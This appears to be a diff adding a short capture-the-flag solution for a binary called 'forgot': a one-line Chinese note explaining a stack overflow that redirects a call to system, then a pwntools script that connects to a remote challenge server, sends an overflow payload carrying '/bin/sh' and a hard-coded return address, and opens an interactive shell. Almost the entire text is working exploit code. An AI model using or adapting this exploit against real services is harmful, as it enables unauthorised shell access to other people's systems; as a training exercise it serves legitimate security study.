@@ -1,0 +1,14 @@
+栈溢出，修改call taint为system，配上合理的参数。
+
+from pwn import *
+#p = process("./forgot")
+p = remote("111.198.29.45",33560)
+#gdb.attach(p, "b * 0x8048a65")
+payload = "hh" 
+p.recvuntil("What is your name?\n> ")
+p.sendline(payload)
+p.recvuntil("Enter the string to be validate\n> ")
+payload = "/bin/sh\x00"+"a"*28 + p32(0x08048480)
+p.sendline(payload)
+
+p.interactive()
